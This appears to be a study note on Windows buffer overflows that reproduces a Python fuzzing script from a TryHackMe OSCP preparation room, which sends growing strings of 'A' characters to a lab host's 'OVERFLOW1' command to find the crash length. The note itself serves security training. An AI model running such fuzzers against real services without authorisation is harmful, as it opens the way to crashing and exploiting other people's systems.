# Windows - Buffer Over Flow


### Fuzzing

This a script from one of the room in TryHackMe. Please try it I will share below the link.
```
import socket, time, sys

ip = "10.10.113.181"
port = 1337
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send("OVERFLOW1 " + string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
```

Link => [TryHackMe-OSCP_Buffer_Overflow_Prep](https://tryhackme.com/room/oscpbufferoverflowprep)